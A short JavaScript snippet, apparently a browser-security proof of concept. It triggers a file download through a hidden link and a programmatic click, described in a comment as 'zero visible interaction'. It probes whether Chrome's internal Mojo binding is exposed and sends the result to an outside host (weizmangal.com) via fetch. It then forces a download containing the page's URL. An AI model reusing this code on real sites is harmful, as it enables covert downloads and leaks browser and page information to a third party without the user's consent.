
  function downloadBlob(blob, filename = 'file.bin') {
  const url = URL.createObjectURL(blob);

  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.style.display = 'none';

  document.documentElement.appendChild(a);
  a.click();              // programmatic click = zero visible interaction
  a.remove();

  // small timeout to avoid revoking before some browsers start the download
  setTimeout(() => URL.revokeObjectURL(url), 1000);
}
let xxx = 'NOTHING';
try { xxx = window['Mojo'] + '' } catch (e) {xxx = 'ERROR: ' + e.message}
try { fetch('https://weizmangal.com/abc123?aaa=' + xxx); } catch(e){}
downloadBlob(new Blob(['aaa_' + location.href]))
